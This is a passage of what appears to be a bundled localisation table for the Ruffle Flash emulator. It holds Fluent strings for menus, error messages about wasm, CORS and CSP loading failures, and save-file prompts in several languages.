Ruffle on the "file:" protocol.\n    This doesn\'t work as browsers block many features from working for security reasons.\n    Instead, we invite you to setup a local server or either use the web demo or the desktop application.\nerror-javascript-config =\n    Ruffle has encountered a major issue due to an incorrect JavaScript configuration.\n    If you are the server administrator, we invite you to check the error details to find out which parameter is at fault.\n    You can also consult the Ruffle wiki for help.\nerror-wasm-not-found =\n    Ruffle failed to load the required ".wasm" file component.\n    If you are the server administrator, please ensure the file has correctly been uploaded.\n    If the issue persists, you may need to use the "publicPath" setting: please consult the Ruffle wiki for help.\nerror-wasm-mime-type =\n    Ruffle has encountered a major issue whilst trying to initialize.\n    This web server is not serving ".wasm" files with the correct MIME type.\n    If you are the server administrator, please consult the Ruffle wiki for help.\nerror-swf-fetch =\n    Ruffle failed to load the Flash SWF file.\n    The most likely reason is that the file no longer exists, so there is nothing for Ruffle to load.\n    Try contacting the website administrator for help.\nerror-swf-cors =\n    Ruffle failed to load the Flash SWF file.\n    Access to fetch has likely been blocked by CORS policy.\n    If you are the server administrator, please consult the Ruffle wiki for help.\nerror-wasm-cors =\n    Ruffle failed to load the required ".wasm" file component.\n    Access to fetch has likely been blocked by CORS policy.\n    If you are the server administrator, please consult the Ruffle wiki for help.\nerror-wasm-invalid =\n    Ruffle has encountered a major issue whilst trying to initialize.\n    It seems like this page has missing or invalid files for running Ruffle.\n    If you are the server administrator, please consult the Ruffle wiki for help.\nerror-wasm-download =\n    Ruffle has encountered a major issue whilst trying to initialize.\n    This can often resolve itself, so you can try reloading the page.\n    Otherwise, please contact the website administrator.\nerror-wasm-disabled-on-edge =\n    Ruffle failed to load the required ".wasm" file component.\n    To fix this, try opening your browser\'s settings, clicking "Privacy, search, and services", scrolling down, and turning off "Enhance your security on the web".\n    This will allow your browser to load the required ".wasm" files.\n    If the issue persists, you might have to use a different browser.\nerror-javascript-conflict =\n    Ruffle has encountered a major issue whilst trying to initialize.\n    It seems like this page uses JavaScript code that conflicts with Ruffle.\n    If you are the server administrator, we invite you to try loading the file on a blank page.\nerror-javascript-conflict-outdated = You can also try to upload a more recent version of Ruffle that may circumvent the issue (current build is outdated: {$buildDate}).\nerror-csp-conflict =\n    Ruffle has encountered a major issue whilst trying to initialize.\n    This web server\'s Content Security Policy does not allow the required ".wasm" component to run.\n    If you are the server administrator, please consult the Ruffle wiki for help.\nerror-unknown =\n    Ruffle has encountered a major issue whilst trying to display this Flash content.\n    {$outdated ->\n        [true] If you are the server administrator, please try to upload a more recent version of Ruffle (current build is outdated: {$buildDate}).\n        *[false] This isn\'t supposed to happen, so we\'d really appreciate if you could file a bug!\n    }\n', "save-manager.ftl": "save-delete-prompt = Are you sure you want to delete this save file?\nsave-reload-prompt =\n    The only way to {$action ->\n    [delete] delete\n    *[replace] replace\n    } this save file without potential conflict is to reload this content. Do you wish to continue anyway?\nsave-download = Download\nsave-replace = Replace\nsave-delete = Delete\nsave-backup-all = Download all save files", "volume-controls.ftl": "volume-controls = Volume controls\nvolume-controls-mute = Mute\nvolume-controls-volume = Volume\n"}, "es-ES": {"context_menu.ftl": "context-menu-download-swf = Descargar .swf\ncontext-menu-copy-debug-info = Copiar Información de depuración\ncontext-menu-open-save-manager = Abrir gestor de guardado\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] Sobre la extensión de Ruffle ({ $version })\n       *[other] Sobre Ruffle ({ $version })\n    }\ncontext-menu-hide = Ocultar este menú\ncontext-menu-exit-fullscreen = Salir de pantalla completa\ncontext-menu-enter-fullscreen = Entrar a pantalla completa\ncontext-menu-volume-controls = Controles de volumen\n", "messages.ftl": 'message-cant-embed =\n    Ruffle no pudo ejecutar el Flash incrustado en esta página.\n    Puedes intentar abrir el archivo en una pestaña aparte, para evitar este problema.\npanic-title = Algo salió mal :(\nmore-info = Más info\nrun-anyway = Ejecutar de todos modos\ncontinue = Continuar\nreport-bug = Reportar un Error\nupdate-ruffle = Actualizar Ruffle\nruffle-demo = Demostración de web\nruffle-desktop = Aplicación de Desktop\nruffle-wiki = Ver la página wiki\nenable-hardware-acceleration = Al parecer, la aceleración de hardware no esta habilitada. Puede que Ruffle funcione, pero será extremadamente lento. Puedes averiguar como habilitar la aceleración de hardware al entrar al enlace.\nview-error-details = Ver los detalles del error\nopen-in-new-tab = Abrir en una pestaña nueva\nclick-to-unmute = Haz clic para dejar de silenciar\nerror-file-protocol =\n    Parece que está ejecutando Ruffle en el protocolo "archivo:".\n    Esto no funciona porque los navegadores bloquean que muchas características funcionen por razones de seguridad.\n    En su lugar, le invitamos a configurar un servidor local o bien usar la demostración web o la aplicación de desktop.\nerror-javascript-config =\n    Ruffle ha encontrado un problema crítico debido a una configuración JavaScript incorrecta.\n    Si usted es el administrador del servidor, le invitamos a comprobar los detalles del error para averiguar qué parámetro está en falta.\n    También puedes consultar la wiki de Ruffle para obtener ayuda.\nerror-wasm-not-found =\n    Ruffle no pudo cargar el componente de archivo ".wasm" requerido.\n    Si usted es el administrador del servidor, asegúrese de que el archivo ha sido subido correctamente.\n    Si el problema persiste, puede que necesite usar la configuración "publicPath": por favor consulte la wiki de Ruffle para obtener ayuda.\nerror-wasm-mime-type =\n    Ruffle ha encontrado un problema crítico al intentar inicializar.\n    Este servidor web no está sirviendo archivos wasm" con el tipo MIME correcto.\n    Si usted es el administrador del servidor, consulte la wiki de Ruffle para obtener ayuda.\nerror-swf-fetch =\n    Ruffle no pudo cargar el archivo Flash SWF.\n    La razón más probable es que el archivo ya no existe, así que no hay nada para cargar Ruffle.\n    Intente ponerse en contacto con el administrador del sitio web para obtener ayuda.\nerror-swf-cors =\n    Ruffle no pudo cargar el archivo Flash SWF.\n    Es probable que el acceso a la búsqueda haya sido bloqueado por la política CORS.\n    Si usted es el administrador del servidor, consulte la wiki de Ruffle para obtener ayuda.\nerror-wasm-cors =\n    Ruffle no pudo cargar el archivo ".wasm."\n    Es probable que el acceso a la búsqueda o la llamada a la función fetch haya sido bloqueado por la política CORS.\n    Si usted es el administrador del servidor, consulte la wiki de Ruffle para obtener ayuda.\nerror-wasm-invalid =\n    Ruffle ha encontrado un problema crítico al intentar inicializar.\n    Este servidor web no está sirviendo archivos wasm" con el tipo Mime correcto.\n    Si usted es el administrador del servidor, consulte la wiki de Ruffle para obtener ayuda.\nerror-wasm-download =\n    Ruffle ha encontrado un problema crítico mientras intentaba inicializarse.\n    Esto a menudo puede resolverse por sí mismo, así que puede intentar recargar la página.\n    De lo contrario, póngase en contacto con el administrador del sitio web.\nerror-wasm-disabled-on-edge =\n    Ruffle no pudo cargar el componente de archivo ".wasm" requerido.\n    Para solucionar esto, intenta abrir la configuración de tu navegador, haciendo clic en "Privacidad, búsqueda y servicios", desplazándote y apagando "Mejore su seguridad en la web".\n    Esto permitirá a su navegador cargar los archivos ".wasm" necesarios.\n    Si el problema persiste, puede que tenga que utilizar un navegador diferente.\nerror-javascript-conflict =\n    Ruffle ha encontrado un problema crítico mientras intentaba inicializarse.\n    Parece que esta página utiliza código JavaScript que entra en conflicto con Ruffle.\n    Si usted es el administrador del servidor, le invitamos a intentar cargar el archivo en una página en blanco.\nerror-javascript-conflict-outdated = También puedes intentar subir una versión más reciente de Ruffle que puede eludir el problema (la versión actual está desactualizada: { $buildDate }).\nerror-csp-conflict =\n    Ruffle encontró un problema al intentar inicializarse.\n    La Política de Seguridad de Contenido de este servidor web no permite el componente requerido ".wasm". \n    Si usted es el administrador del servidor, por favor consulta la wiki de Ruffle para obtener ayuda.\nerror-unknown =\n    Ruffle ha encontrado un problema al tratar de mostrar el contenido Flash.\n    { $outdated ->\n        [true] Si usted es el administrador del servidor, intenta cargar una version más reciente de Ruffle (la version actual esta desactualizada: { $buildDate }).\n       *[false] Esto no deberia suceder! apreciariamos que reportes el error!\n    }\n', "save-manager.ftl": "save-delete-prompt = ¿Está seguro de querer eliminar este archivo de guardado?\nsave-reload-prompt =\n    La única forma de { $action ->\n        [delete] eliminar\n       *[replace] sobreescribir\n    } este archivo de guardado sin conflictos potenciales es reiniciando el contenido. ¿Desea continuar de todos modos?\nsave-download = Descargar\nsave-replace = Sobreescribir\nsave-delete = Borrar\nsave-backup-all = Borrar todos los archivos de guardado\n", "volume-controls.ftl": "volume-controls = Controles de volumen\nvolume-controls-mute = Silenciar\nvolume-controls-volume = Volumen\n"}, "fr-FR": {"context_menu.ftl": "context-menu-download-swf = Télécharger en tant que .swf\ncontext-menu-copy-debug-info = Copier les infos de débogage\ncontext-menu-open-save-manager = Ouvrir le gestionnaire de stockage\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] À propos de l'Extension Ruffle ({ $version })\n       *[other] À propos de Ruffle ({ $version })\n    }\ncontext-menu-hide = Masquer ce menu\ncontext-menu-exit-fullscreen = Sortir du mode plein écran\ncontext-menu-enter-fullscreen = Afficher en plein écran\ncontext-menu-volume-controls = Contrôles du volume\n", "messages.ftl": "message-cant-embed =\n    Ruffle n'a pas été en mesure de lire le fichier Flash intégré dans cette page.\n    Vous pouvez essayer d'ouvrir le fichier dans un onglet isolé, pour contourner le problème.\npanic-title = Une erreur est survenue :(\nmore-info = Plus d'infos\nrun-anyway = Exécuter quand même\ncontinue = Continuer\nreport-bug = Signaler le bug\nupdate-ruffle = Mettre à jour Ruffle\nruffle-demo = Démo en ligne\nruffle-desktop = Application de bureau\nruffle-wiki = Wiki de Ruffle\nenable-hardware-acceleration = Il semblerait que l'accélération matérielle ne soit pas activée. Cela n'empêche généralement pas Ruffle de fonctionner, mais il peut être beaucoup plus lent. Vous pouvez trouver comment activer l'accélération matérielle en suivant ce lien.\nview-error-details = Détails de l'erreur\nopen-in-new-tab = Ouvrir dans un nouvel onglet\nclick-to-unmute = Cliquez pour activer le son\nerror-file-protocol =\n    Il semblerait que vous exécutiez Ruffle sur le protocole \"file:\".\n    Cela ne fonctionne pas car les navigateurs bloquent de nombreuses fonctionnalités pour des raisons de sécurité.\n    Nous vous invitons soit à configurer un serveur local, soit à utiliser la démo en ligne ou l'application de bureau.\nerror-javascript-config =\n    Ruffle a rencontré un problème majeur en raison d'une configuration JavaScript incorrecte.\n    Si vous êtes l'administrateur du serveur, nous vous invitons à vérifier les détails de l'erreur pour savoir quel est le paramètre en cause.\n    Vous pouvez également consulter le wiki de Ruffle pour obtenir de l'aide.\nerror-wasm-not-found =\n    Ruffle n'a pas réussi à charger son fichier \".wasm\".\n    Si vous êtes l'administrateur du serveur, veuillez vous assurer que ce fichier a bien été mis en ligne.\n    Si le problème persiste, il vous faudra peut-être utiliser le paramètre \"publicPath\" : veuillez consulter le wiki de Ruffle pour obtenir de l'aide.\nerror-wasm-mime-type =\n    Ruffle a rencontré un problème majeur durant sa phase d'initialisation.\n    Ce serveur web ne renvoie pas le bon type MIME pour les fichiers \".wasm\".\n    Si vous êtes l'administrateur du serveur, veuillez consulter le wiki de Ruffle pour obtenir de l'aide.\nerror-swf-fetch =\n    Ruffle n'a pas réussi à charger le fichier Flash.\n    La raison la plus probable est que le fichier n'existe pas ou plus.\n    Vous pouvez essayer de prendre contact avec l'administrateur du site pour obtenir plus d'informations.\nerror-swf-cors =\n    Ruffle n'a pas réussi à charger le fichier Flash.\n    La requête a probablement été rejetée en raison de la configuration du CORS.\n    Si vous êtes l'administrateur du serveur, veuillez consulter le wiki de Ruffle pour obtenir de l'aide.\nerror-wasm-cors =\n    Ruffle n'a pas réussi à charger son fichier \".wasm\".\n    La requête a probablement été rejetée en raison de la configuration du CORS.\n    Si vous êtes l'administrateur du serveur, veuillez consulter le wiki de Ruffle pour obtenir de l'aide.\nerror-wasm-invalid =\n    Ruffle a rencontré un problème majeur durant sa phase d'initialisation.\n    Il semblerait que cette page comporte des fichiers manquants ou invalides pour exécuter Ruffle.\n    Si vous êtes l'administrateur du serveur, veuillez consulter le wiki de Ruffle pour obtenir de l'aide.\nerror-wasm-download =\n    Ruffle a rencontré un problème majeur durant sa phase d'initialisation.\n    Le problème détecté peut souvent se résoudre de lui-même, donc vous pouvez essayer de recharger la page.\n    Si le problème persiste, veuillez prendre contact avec l'administrateur du site.\nerror-wasm-disabled-on-edge =\n    Ruffle n'a pas réussi à charger son fichier \".wasm\".\n    Pour résoudre ce problème, essayez d'ouvrir les paramètres de votre navigateur et de cliquer sur \"Confidentialité, recherche et services\". Puis, vers le bas de la page, désactivez l'option \"Améliorez votre sécurité sur le web\".\n    Cela permettra à votre navigateur de charger les fichiers \".wasm\".\n    Si le problème persiste, vous devrez peut-être utiliser un autre navigateur.\nerror-javascript-conflict =\n    Ruffle a rencontré un problème majeur durant sa phase d'initialisation.\n    Il semblerait que cette page contienne du code JavaScript qui entre en conflit avec Ruffle.\n    Si vous êtes l'administrateur du serveur, nous vous invitons à essayer de charger le fichier dans une page vide.\nerror-javascript-conflict-outdated = Vous pouvez également essayer de mettre en ligne une version plus récente de Ruffle qui pourrait avoir corrigé le problème (la version que vous utilisez est obsolète : { $buildDate }).\nerror-csp-conflict =\n    Ruffle a rencontré un problème majeur durant sa phase d'initialisation.\n    La stratégie de sécurité du contenu (CSP) de ce serveur web n'autorise pas l'exécution de fichiers \".wasm\".\n    Si vous êtes l'administrateur du serveur, veuillez consulter le wiki de Ruffle pour obtenir de l'aide.\nerror-unknown =\n    Ruffle a rencontré un problème majeur durant l'exécution de ce contenu Flash.\n    { $outdated ->\n        [true] Si vous êtes l'administrateur du serveur, veuillez essayer de mettre en ligne une version plus récente de Ruffle (la version que vous utilisez est obsolète : { $buildDate }).\n       *[false] Cela n'est pas censé se produire, donc nous vous serions reconnaissants si vous pouviez nous signaler ce bug !\n    }\n", "save-manager.ftl": "save-delete-prompt = Voulez-vous vraiment supprimer ce fichier de sauvegarde ?\nsave-reload-prompt =\n    La seule façon de { $action ->\n        [delete] supprimer\n       *[replace] remplacer\n    } ce fichier de sauvegarde sans conflit potentiel est de recharger ce contenu. Souhaitez-vous quand même continuer ?\nsave-download = Télécharger\nsave-replace = Remplacer\nsave-delete = Supprimer\nsave-backup-all = Télécharger tous les fichiers de sauvegarde\n", "volume-controls.ftl": "volume-controls = Contrôles du volume\nvolume-controls-mute = Muet\nvolume-controls-volume = Volume\n"}, "he-IL": {"context_menu.ftl": "context-menu-download-swf = הורדת קובץ הswf.\ncontext-menu-copy-debug-info = העתקת נתוני ניפוי שגיאות\ncontext-menu-open-save-manager = פתח את מנהל השמירות\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] אודות התוסף Ruffle ({ $version })\n       *[other] אודות Ruffle ({ $version })\n    }\ncontext-menu-hide = הסתר תפריט זה\ncontext-menu-exit-fullscreen = יציאה ממסך מלא\ncontext-menu-enter-fullscreen = מסך מלא\ncontext-menu-volume-controls = בקרת עוצמת קול\n", "messages.ftl": 'message-cant-embed =\n    Ruffle לא הצליח להריץ את תוכן הפלאש המוטמע בדף זה.\n    אתה יכול לפתוח את הקובץ בלשונית נפרדת, על מנת לעקוף בעיה זו.\npanic-title = משהו השתבש :(\nmore-info = מידע נוסף\nrun-anyway = הפעל בכל זאת\ncontinue = המשך\nreport-bug = דווח על תקלה\nupdate-ruffle = עדכן את Ruffle\nruffle-demo = הדגמה\nruffle-desktop = אפליקציית שולחן עבודה\nruffle-wiki = ראה את Ruffle wiki\nenable-hardware-acceleration = נראה שהאצת החומרה שלך לא מופעלת. בעוד שראפל עשוי לעבוד, הוא יכול להיות איטי. תוכל לראות כיצד להפעיל תכונה זו בלחיצה על הלינק הזה.\nview-error-details = ראה פרטי שגיאה\nopen-in-new-tab = פתח בכרטיסייה חדשה\nclick-to-unmute = לחץ על מנת לבטל השתקה\nerror-file-protocol =\n    נדמה שאתה מריץ את Ruffle תחת פרוטוקול "file:".\n    זה לא יעבוד מכיוון שדפדפנים חוסמים אפשרויות רבות מלעבוד עקב סיבות אבטחה.\n    במקום זה, אנו מזמינים אותך לאחסן אתר זה תחת שרת מקומי או הדגמה ברשת או דרך אפליקציית שולחן העבודה.\nerror-javascript-config =\n    Ruffle נתקל בתקלה חמורה עקב הגדרת JavaScript שגויה.\n    אם אתה מנהל האתר, אנו מזמינים אותך לבדוק את פרטי השגיאה על מנת למצוא איזה פרמטר הוא שגוי.\n    אתה יכול לעיין ולהועץ בwiki של Ruffle על מנת לקבל עזרה.\nerror-wasm-not-found =\n    Ruffle נכשל לטעון את קובץ ה"wasm." הדרוש.\n    אם אתה מנהל האתר, אנא וודא כי הקובץ הועלה כשורה.\n    אם הבעיה ממשיכה, ייתכן ותצטרך להשתמש בהגדרת "publicPath": אנא עיין והועץ בwiki של Ruffle על מנת לקבל עזרה.\nerror-wasm-mime-type =\n    Ruffle נתקל בבעיה חמורה תוך כדי ניסיון לאתחל.\n    שרתו של אתר זה לא משייך קבצי ".wasm" עם סוג הMIME הנכון.\n    אם אתה מנהל האתר, אנא עיין והועץ בwiki של Ruffle על מנת לקבל עזרה.\nerror-swf-fetch =\n    Ruffle נכשל לטעון את קובץ הפלאש/swf. .\n    זה נובע ככל הנראה מכיוון והקובץ לא קיים יותר, אז אין לRuffle מה לטעון.\n    נסה ליצור קשר עם מנהל האתר על מנת לקבל עזרה.\nerror-swf-cors =\n    Ruffle נכשל לטעון את קובץ הפלאש/swf. .\n    גישה לfetch ככל הנראה נחסמה על ידי מדיניות CORS.\n    אם אתה מנהל האתר, אנא עיין והועץ בwiki של Ruffle על מנת לקבל עזרה.\nerror-wasm-cors =\n    Ruffle נכשל לטעון את קובץ ה".wasm" הדרוש.\n    גישה לfetch ככל הנראה נחסמה על ידי מדיניות CORS.\n    אם אתה מנהל האתר, אנא עיין והועץ בwiki של Ruffle על מנת לקבל עזרה.\nerror-wasm-invalid =\n    Ruffle נתקל בבעיה חמורה תוך כדי ניסיון לאתחל.\n    נדמה כי בדף זה חסרים או לא עובדים כראוי קבצים אשר משמשים את Ruffle כדי לפעול\n    אם אתה מנהל האתר, אנא עיין והועץ בwiki של Ruffle על מנת לקבל עזרה.\nerror-wasm-download =\n    Ruffle נתקל בבעיה חמורה תוך כדי ניסיון לאתחל.\n    לעיתים בעיה זו יכולה לפתור את עצמה, אז אתה יכול לנסות לטעון מחדש את הדף זה.\n    אם לא, אנא פנה למנהל האתר.\nerror-wasm-disabled-on-edge =\n    Ruffle נכשל לטעון את קובץ ה".wasm" הדרוש.\n    על מנת לתקן בעיה זו, נסה לפתוח את הגדרות הדפדפן שלך, לחץ על "אבטחה, חיפוש ושירות",\n    גלול מטה, וכבה את "הגבר את האבטחה שלך ברשת".\n    זה יאפשר לדפדפן שלך לטעון את קובץ ה".wasm" הדרוש.\n    אם הבעיה ממשיכה, ייתכן ועליך להשתמש בדפדפן אחר.\nerror-javascript-conflict =\n    Ruffle נתקל בבעיה חמורה תוך כדי ניסיון לאתחל.\n    נדמה כי דף זה משתמש בקוד JavaScript אשר מתנגש עם Ruffle.\n    אם אתה מנהל האתר, אנו מזמינים אותך לנסות לטעון את הדף תחת עמוד ריק.\nerror-javascript-conflict-outdated = בנוסף, אתה יכול לנסות ולהעלות גרסאות עדכניות של Ruffle אשר עלולים לעקוף בעיה זו (גרסה זו הינה מיושנת : { $buildDate }).\nerror-csp-conflict =\n    Ruffle נתקל בבעיה חמורה תוך כדי ניסיון לאתחל.\n    מדיניות אבטחת התוכן של שרתו של אתר זה אינה מאפשרת לקובץ ה"wasm." הדרוש לפעול.\n    אם אתה מנהל האתר, אנא עיין והועץ בwiki של Ruffle על מנת לקבל עזרה.\nerror-unknown =\n    Ruffle נתקל בבעיה חמורה בניסיון להציג את תוכן פלאש זה.\n    { $outdated ->\n        [true] אם אתה מנהל האתר, אנא נסה להעלות גרסה עדכנית יותר של Ruffle (גרסה זו הינה מיושנת:  { $buildDate }).\n       *[false] זה לא אמור לקרות, נשמח אם תוכל לשתף תקלה זו!\n    }\n', "save-manager.ftl": "save-delete-prompt = האם אתה בטוח שברצונך למחוק את קובץ שמירה זה?\nsave-reload-prompt =\n    הדרך היחידה { $action ->\n        [delete] למחוק\n       *[replace] להחליף\n    } את קובץ השמירה הזה מבלי לגרום לו להתנגש היא לטעון מחדש את תוכן זה. האם אתה רוצה להמשיך בכל זאת?\nsave-download = הורדה\nsave-replace = החלפה\nsave-delete = מחיקה\nsave-backup-all = הורדת כל קבצי השמירה\n", "volume-controls.ftl": "volume-controls = בקרת עוצמת קול\nvolume-controls-mute = השתק\nvolume-controls-volume = עוצמת קול\n"}, "hu-HU": {"context_menu.ftl": "context-menu-download-swf = .swf fájl letöltése\ncontext-menu-copy-debug-info = Hibakeresési információk másolása\ncontext-menu-open-save-manager = Mentéskezelő megnyitása\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] A Ruffle kiegészítő ({ $version }) névjegye\n       *[other] A Ruffle ({ $version }) névjegye\n    }\ncontext-menu-hide = Ezen menü elrejtése\ncontext-menu-exit-fullscreen = Kilépés a teljes képernyőből\ncontext-menu-enter-fullscreen = Váltás teljes képernyőre\ncontext-menu-volume-controls = Hangerőszabályzó\n", "messages.ftl": 'message-cant-embed =\n    A Ruffle nem tudta futtatni az oldalba ágyazott Flash tartalmat.\n    A probléma kikerüléséhez megpróbálhatod megnyitni a fájlt egy külön lapon.\npanic-title = Valami baj történt :(\nmore-info = További információ\nrun-anyway = Futtatás mégis\ncontinue = Folytatás\nreport-bug = Hiba jelentése\nupdate-ruffle = Ruffle frissítése\nruffle-demo = Webes demó\nruffle-desktop = Asztali alkalmazás\nruffle-wiki = Ruffle Wiki megnyitása\nenable-hardware-acceleration = Úgy tűnik, a hardveres gyorsítás nincs engedélyezve. Bár a Ruffle működhet, nagyon lassú lehet. Ezt a hivatkozást követve megtudhatod, hogyan engedélyezd a hardveres gyorsítást.\nview-error-details = Hiba részletei\nopen-in-new-tab = Megnyitás új lapon\nclick-to-unmute = Kattints a némítás feloldásához\nerror-file-protocol =\n    Úgy tűnik, a Ruffle-t a "file:" protokollon futtatod.\n    Ez nem működik, mivel így a böngészők biztonsági okokból számos funkció működését letiltják.\n    Ehelyett azt ajánljuk hogy indíts egy helyi kiszolgálót, vagy használd a webes demót vagy az asztali alkalmazást.\nerror-javascript-config =\n    A Ruffle komoly problémába ütközött egy helytelen JavaScript-konfiguráció miatt.\n    Ha a szerver rendszergazdája vagy, kérjük, ellenőrizd a hiba részleteit, hogy megtudd, melyik paraméter a hibás.\n    A Ruffle wikiben is találhatsz ehhez segítséget.\nerror-wasm-not-found =\n    A Ruffle nem tudta betölteni a szükséges ".wasm" összetevőt.\n    Ha a szerver rendszergazdája vagy, kérjük ellenőrizd, hogy a fájl megfelelően lett-e feltöltve.\n    Ha a probléma továbbra is fennáll, előfordulhat, hogy a "publicPath" beállítást kell használnod: segítségért keresd fel a Ruffle wikit.\nerror-wasm-mime-type =\n    A Ruffle komoly problémába ütközött az inicializálás során.\n    Ez a webszerver a ".wasm" fájlokat nem a megfelelő MIME-típussal szolgálja ki.\n    Ha a szerver rendszergazdája vagy, kérjük, keresd fel a Ruffle wikit segítségért.\nerror-swf-fetch =\n    A Ruffle nem tudta betölteni a Flash SWF fájlt.\n    A legvalószínűbb ok az, hogy a fájl már nem létezik, így a Ruffle számára nincs mit betölteni.\n    Próbáld meg felvenni a kapcsolatot a webhely rendszergazdájával segítségért.\nerror-swf-cors =\n    A Ruffle nem tudta betölteni a Flash SWF fájlt.\n    A lekéréshez való hozzáférést valószínűleg letiltotta a CORS-házirend.\n    Ha a szerver rendszergazdája vagy, kérjük, keresd fel a Ruffle wikit segítségért.\nerror-wasm-cors =\n    A Ruffle nem tudta betölteni a szükséges ".wasm" összetevőt.\n    A lekéréshez való hozzáférést valószínűleg letiltotta a CORS-házirend.\n    Ha a szerver rendszergazdája vagy, kérjük keresd fel a Ruffle wikit segítségért.\nerror-wasm-invalid =\n    A Ruffle komoly problémába ütközött az inicializálás során.\n    Úgy tűnik, hogy ezen az oldalon hiányoznak vagy hibásak a Ruffle futtatásához szükséges fájlok.\n    Ha a szerver rendszergazdája vagy, kérjük keresd fel a Ruffle wikit segítségért.\nerror-wasm-download =\n    A Ruffle komoly problémába ütközött az inicializálás során.\n    Ez gyakran magától megoldódik, ezért megpróbálhatod újratölteni az oldalt.\n    Ellenkező esetben fordulj a webhely rendszergazdájához.\nerror-wasm-disabled-on-edge =\n    A Ruffle nem tudta betölteni a szükséges ".wasm" összetevőt.\n    A probléma megoldásához nyisd meg a böngésző beállításait, kattints az „Adatvédelem, keresés és szolgáltatások” elemre, görgess le, és kapcsold ki a „Fokozott biztonság a weben” opciót.\n    Ez lehetővé teszi a böngésző számára, hogy betöltse a szükséges ".wasm" fájlokat.\n    Ha a probléma továbbra is fennáll, lehet, hogy másik böngészőt kell használnod.\nerror-javascript-conflict =\n    A Ruffle komoly problémába ütközött az inicializálás során.\n    Úgy tűnik, ez az oldal olyan JavaScript-kódot használ, amely ütközik a Ruffle-lel.\n    Ha a kiszolgáló rendszergazdája vagy, kérjük, próbáld meg a fájlt egy üres oldalon betölteni.\nerror-javascript-conflict-outdated = Megpróbálhatod továbbá feltölteni a Ruffle egy újabb verzióját is, amely megkerülheti a problémát (a jelenlegi elavult: { $buildDate }).\nerror-csp-conflict =\n    A Ruffle komoly problémába ütközött az inicializálás során.\n    A kiszolgáló tartalombiztonsági házirendje nem teszi lehetővé a szükséges „.wasm” összetevők futtatását.\n    Ha a szerver rendszergazdája vagy, kérjük, keresd fel a Ruffle wikit segítségért.\nerror-unknown =\n    A Ruffle komoly problémába ütközött, miközben megpróbálta megjeleníteni ezt a Flash-tartalmat.\n    { $outdated ->\n        [true] Ha a szerver rendszergazdája vagy, kérjük, próbáld meg feltölteni a Ruffle egy újabb verzióját (a jelenlegi elavult: { $buildDate }).\n       *[false] Ennek nem lett volna szabad megtörténnie, ezért nagyon hálásak lennénk, ha jeleznéd a hibát!\n    }\n', "save-manager.ftl": "save-delete-prompt = Biztosan törölni akarod ezt a mentést?\nsave-reload-prompt =\n    Ennek a mentésnek az esetleges konfliktus nélküli { $action ->\n        [delete] törléséhez\n       *[replace] cseréjéhez\n    } újra kell tölteni a tartalmat. Mégis szeretnéd folytatni?\nsave-download = Letöltés\nsave-replace = Csere\nsave-delete = Törlés\nsave-backup-all = Az összes fájl letöltése\n", "volume-controls.ftl": "volume-controls = Hangerőszabályzó\nvolume-controls-mute = Némítás\nvolume-controls-volume = Hangerő\n"}, "id-ID": {"context_menu.ftl": "context-menu-download-swf = Unduh .swf\ncontext-menu-copy-debug-info = Salin info debug\ncontext-menu-open-save-manager = Buka Manager Save\ncontext-menu-about-ruffle =\n    { $flavor ->\n        [extension] Tentang Ekstensi Ruffle ({ $version })\n       *[other] Tentang Ruffle ({ $version })\n    }\ncontext-menu-hide = Sembunyikan Menu ini\ncontext-menu-exit-fullscreen = Keluar dari layar penuh\ncontext-menu-enter-fullscreen = Masuk mode layar penuh\ncontext-menu-volume-controls = Pengaturan Volume\n", "messages.ftl": 'message-cant-embed =\n    Ruffle tidak dapat menjalankan Flash yang disematkan di halaman ini.\n    Anda dapat mencoba membuka file di tab terpisah, untuk menghindari masalah ini.\npanic-title = Terjadi kesalahan :(\nmore-info = Info lebih lanjut\nrun-anyway = Jalankan\ncontinue = Lanjutkan\nreport-bug = Laporkan Bug\nupdate-ruffle = Perbarui Ruffle\nruffle-demo = Demo Web\nruffle-desktop = Aplikasi Desktop\nruffle-wiki = Kunjungi Wiki Ruffle\nenable-hardware-acceleration = Sepertinya akselerasi perangkat keras tidak aktif. Ruffle tetap akan bekerja, Namun dapat bekerja dengan sangat lambat. Anda dapat mengaktifkan akselerasi perangkat keras dengan menggunakan link berikut.\nview-error-details = Tunjukan Detail Error\nopen-in-new-tab = Buka di Tab Baru\nclick-to-unmute = Tekan untuk menyalakan suara\nerror-file-protocol =\n    Sepertinya anda menjalankan Ruffle di protokol "file:". \n    Ini tidak berfungsi karena browser memblokir fitur ini dengan alasan keamanan.\n    Sebagai gantinya, kami mengajak anda untuk membuat server lokal, menggunakan demo web atau aplikasi desktop.\nerror-javascript-config =\n    Ruffle mengalami masalah besar karena konfigurasi JavaScript yang salah.\n    Jika Anda adalah administrator server ini, kami mengajak Anda untuk memeriksa detail kesalahan untuk mengetahui parameter mana yang salah.\n    Anda juga dapat membaca wiki Ruffle untuk mendapatkan bantuan.\nerror-wasm-not-found =\n    Ruffle gagal memuat komponen file ".wasm" yang diperlukan.\n    Jika Anda adalah administrator server ini, pastikan file telah diunggah dengan benar.\n    Jika masalah terus berlanjut, Anda mungkin perlu menggunakan pengaturan "publicPath": silakan baca wiki Ruffle untuk mendapatkan bantuan.\nerror-wasm-mime-type =\n    Ruffle mengalami masalah ketika mencoba melakukan inisialisasi.\n    Server web ini tidak melayani file ".wasm" dengan tipe MIME yang benar.\n    Jika Anda adalah administrator server ini, silakan baca wiki Ruffle untuk mendapatkan bantuan.\nerror-swf-fetch =\n    Ruffle gagal memuat file SWF Flash.\n    Kemungkinan file tersebut sudah tidak ada, sehingga tidak dapat dimuat oleh Ruffle.\n    Coba hubungi administrator situs web ini untuk mendapatkan bantuan.\nerror-swf-cors =\n    Ruffle gagal memuat file SWF Flash.\n    Akses untuk memuat kemungkinan telah diblokir oleh kebijakan CORS.\n    Jika Anda adalah administrator server ini, silakan baca wiki Ruffle untuk mendapatkan bantuan.\nerror-wasm-cors =\n    Ruffle gagal memuat komponen file ".wasm" yang diperlukan.\n    Akses untuk mengambil kemungkinan telah diblokir oleh kebijakan CORS.\n    Jika Anda adalah administrator server ini, silakan baca wiki Ruffle untuk mendapatkan bantuan.\nerror-wasm-invalid =\n    Ruffle mengalami masalah besar ketika mencoba melakukan inisialisasi.\n    Sepertinya halaman ini memiliki file yang hilang atau tidak valid untuk menjalankan Ruffle.\n    Jika Anda adalah administrator server ini, silakan baca wiki Ruffle untuk mendapatkan bantuan.\nerror-wasm-download =\n    